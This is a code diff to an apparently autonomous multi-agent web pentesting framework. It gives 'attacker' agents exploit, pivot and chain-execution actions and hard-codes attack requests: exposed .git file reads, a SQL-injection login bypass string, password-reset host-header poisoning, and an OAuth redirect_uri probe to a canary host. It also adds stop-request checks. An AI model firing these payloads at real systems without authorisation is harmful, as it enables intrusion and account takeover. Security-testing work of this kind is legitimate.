@@ -28,6 +28,7 @@ import re
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import quote, urlsplit
 
 from .agents import _first_json
 from .autopilot import ACTIONS as OPERATOR_ACTIONS
@@ -69,7 +70,10 @@ ROLE_ACTIONS = {
               "inbox_create", "inbox_list", "inbox_wait", "inbox_read",
               "browser_open", "browser_goto", "browser_snapshot",
               "browser_type", "browser_click",
-              "auth_profile_list", "auth_profile_set", "reveng_analyze"),
+              "auth_profile_list", "auth_profile_set", "reveng_analyze",
+              "git_dump", "codeaudit_scan", "postex_plan",
+              "exploit_catalog", "exploit_search", "exploit_plan",
+              "chain_templates"),
     "attacker": ("http_request", "http_probe", "http_upload", "oracle_extract", "race_run",
                  "single_packet_race", "last_byte_race", "http_path_diff",
                  "access_control_compare", "idor_sequence_probe",
@@ -79,7 +83,10 @@ ROLE_ACTIONS = {
                  "chain_plan", "technique_search", "chain_search",
                  "browser_goto", "browser_snapshot", "browser_type",
                  "browser_click", "auth_profile_list", "inbox_wait",
-                 "reveng_analyze"),
+                 "reveng_analyze", "postex_plan", "token_pivot",
+                 "exploit_catalog", "exploit_search", "exploit_plan",
+                 "exploit_run", "candidates_list", "chain_templates",
+                 "chain_execute"),
     "validator": ("hypothesis_list", "http_probe", "retest_request",
                   "access_control_compare", "lessons_list", "agent_notes_list",
                   "auth_profile_list", "browser_snapshot"),
@@ -94,6 +101,7 @@ EVIDENCE_ACTIONS = {
     "oracle_extract", "race_run", "single_packet_race", "last_byte_race",
     "host_probe", "web_surface_inventory", "auth_flow_inventory",
     "reset_flow_inventory", "session_cookie_audit", "security_headers_audit",
+    "exploit_run",
     "cors_policy_audit", "access_control_compare", "idor_sequence_probe",
     "input_reflection_probe", "injection_differential_probe",
     "upload_policy_probe", "retest_request",
@@ -262,6 +270,18 @@ def _anchor_url(text: str) -> str:
         path = (match.group(2) or "/").rstrip(".,);]'\"")
         return f"https://{host}{path or '/'}"
     return ""
+
+
+def _origin_url(value: str) -> str:
+    """Return scheme://host for a URL or bare host, or '' when unusable."""
+    raw = str(value or "").strip()
+    try:
+        parts = urlsplit(raw if "://" in raw else "https://" + raw)
+    except ValueError:
+        return ""
+    if not parts.netloc:
+        return ""
+    return f"{parts.scheme or 'https'}://{parts.netloc}"
 
 
 class Swarm(Autopilot):
@@ -1022,6 +1042,93 @@ class Swarm(Autopilot):
         anchor = self._objective_anchor(objective)
         if not anchor:
             return None
+        origin = _origin_url(anchor)
+        if not origin:
+            return None
+        # Version-control exposure is a source-read primitive. Probe the
+        # canonical .git files directly instead of guessing a page.
+        if any(token in text for token in
+               (".git", "git repo", "git object", "vcs", "source disclosure",
+                "exposed source", "source leak")):
+            if "config" in text:
+                path = "/.git/config"
+            elif "index" in text:
+                path = "/.git/index"
+            elif "log" in text:
+                path = "/.git/logs/HEAD"
+            else:
+                path = "/.git/HEAD"
+            return {"action": "http_request",
+                    "args": {"target": origin + path, "method": "GET",
+                             "follow_redirects": False, "max_bytes": 32768},
+                    "why": "read the exposed VCS metadata directly and capture the raw response",
+                    "expects": "a 200 with git refs/objects, not a themed error page",
+                    "hypothesis": str(objective.get("hypothesis") or "")[:240],
+                    "falsifier": "the path returns the application shell or a 404"}
+        # Login injection must be a POST with credentials, not a GET of the
+        # form. One bypass string per round; the validator compares it with
+        # the invalid-password baseline.
+        if any(token in text for token in
+               ("sqli", "sql injection", "login bypass", "auth-sqli",
+                "injection in the login", "or '1'='1", "authentication bypass")):
+            login = anchor if "login" in anchor.lower() else origin + "/login"
+            return {"action": "http_request",
+                    "args": {"target": login, "method": "POST",
+                             "form": {"username": "admin' OR '1'='1' -- -",
+                                      "password": "nc3r-invalid"},
+                             "follow_redirects": False, "max_bytes": 32768},
+                    "why": "submit one SQLi login bypass and compare it with the invalid-password baseline",
+                    "expects": ("a redirect, cookie, dashboard body, or different error "
+                                "than the invalid-password response"),
+                    "hypothesis": str(objective.get("hypothesis") or "")[:240],
+                    "falsifier": "every credential pair gets the same generic failure"}
+        # Password-reset host-header poisoning: ask for a reset and look at
+        # the link host. Never send a real user's address.
+        if any(token in text for token in
+               ("reset", "forgot", "recovery", "host header", "host-header",
+                "password-reset")):
+            reset = anchor if any(token in anchor.lower()
+                                  for token in ("reset", "forgot", "recovery")) \
+                else origin + "/forgot-password"
+            return {"action": "http_request",
+                    "args": {"target": reset, "method": "POST",
+                             "form": {"email": "nc3r-probe@example.com"},
+                             "headers": {"X-Forwarded-Host": "nc3r-canary.example",
+                                         "X-Forwarded-Proto": "https"},
+                             "follow_redirects": False, "max_bytes": 32768},
+                    "why": ("request a reset with an attacker-controlled forwarded host "
+                            "and inspect the generated link"),
+                    "expects": ("a reset link/token whose host is nc3r-canary.example, "
+                                "or a different response than the baseline"),
+                    "hypothesis": str(objective.get("hypothesis") or "")[:240],
+                    "falsifier": "the link stays on the canonical host or no link is issued"}
+        # OAuth / open-redirect: one redirect_uri probe with a canary host.
+        if any(token in text for token in
+               ("oauth", "redirect_uri", "open redirect", "callback",
+                "authorization code")):
+            anchor_path = (urlsplit(anchor).path or "/").lower()
+            if anchor_path not in ("", "/") and "login" not in anchor_path:
+                # An explicit /oauth (or callback) anchor is already the
+                # surface to capture; do not rewrite it into a guessed login.
+                return {"action": "http_request",
+                        "args": {"target": anchor, "method": "GET",
+                                 "follow_redirects": False, "max_bytes": 32768},
+                        "why": "capture the raw OAuth endpoint response before any redirect test",
+                        "expects": "a redirect, error, or token/code handling difference",
+                        "hypothesis": str(objective.get("hypothesis") or "")[:240],
+                        "falsifier": "the endpoint is a static page with no OAuth state"}
+            login = anchor if "login" in anchor_path else origin + "/login"
+            joiner = "&" if "?" in login else "?"
+            target = (f"{login}{joiner}redirect_uri="
+                      f"{quote('https://nc3r-canary.example/cb', safe='')}"
+                      "&state=nc3r-state")
+            return {"action": "http_request",
+                    "args": {"target": target, "method": "GET",
+                             "follow_redirects": False, "max_bytes": 32768},
+                    "why": "check whether the redirect_uri is reflected into a 30x Location",
+                    "expects": "a Location on the canary host or a visible parser difference",
+                    "hypothesis": str(objective.get("hypothesis") or "")[:240],
+                    "falsifier": "the redirect stays on the canonical host or is rejected"}
         if any(token in text for token in
                ("upload", "file upload", "multipart", "attachment", "import")):
             return {"action": "upload_policy_probe",
@@ -1094,6 +1201,8 @@ class Swarm(Autopilot):
     def _propose_all(self, objectives: list[dict],
                      round_no: int) -> list[dict]:
         if not objectives:
+            return []
+        if self.should_stop is not None and self.should_stop():
             return []
         workers = max(1, min(len(objectives), MAX_OBJECTIVES))
         with ThreadPoolExecutor(max_workers=workers,
@@ -1203,6 +1312,8 @@ class Swarm(Autopilot):
             # Nothing ran, so there is nothing to interpret. Spend no model
             # call on an empty digest; the stored round note already says it.
             return
+        if self.should_stop is not None and self.should_stop():
+            return
         data, _, _ = self._ask("scribe", {"phase": "scribe", "round": round_no,
                                           "digest": digest})
         notes = (data or {}).get("notes")
@@ -1256,6 +1367,11 @@ class Swarm(Autopilot):
             objectives, plan_note, finished = self._strategise(
                 brief, self._observations, next_round)
             self._emit("reason", {"agent": "strategist", "text": plan_note})
+            # A stop can land while the strategist model is answering. Honour
+            # it before scheduling another batch of work.
+            if self.should_stop is not None and self.should_stop():
+                stop = "cancelled"
+                break
             objectives = objectives or []
             self._ensure_task_ids(objectives, next_round)
             objectives, skipped = self._filter_skipped(objectives)
@@ -1299,6 +1415,9 @@ class Swarm(Autopilot):
 
             proposals = self._propose_all(objectives, self.rounds)
             if not proposals:
+                if self.should_stop is not None and self.should_stop():
+                    stop = "cancelled"
+                    break
                 if self.endless:
                     self._emit("decide", {
                         "agent": "strategist",
@@ -1310,7 +1429,12 @@ class Swarm(Autopilot):
                 break
 
             rows: list[dict] = []
+            cancelled = False
             for item in proposals:
+                if self.should_stop is not None and self.should_stop():
+                    stop = "cancelled"
+                    cancelled = True
+                    break
                 if len(executed) >= self.max_steps:
                     break
                 # A directive can land while the round is executing. Honour it
@@ -1430,6 +1554,8 @@ class Swarm(Autopilot):
                         break
                     stop = "three consecutive tool errors"
                     break
+            if cancelled:
+                break
             self._scribe(self.rounds, rows)
             if errors >= 5:
                 if self.endless:
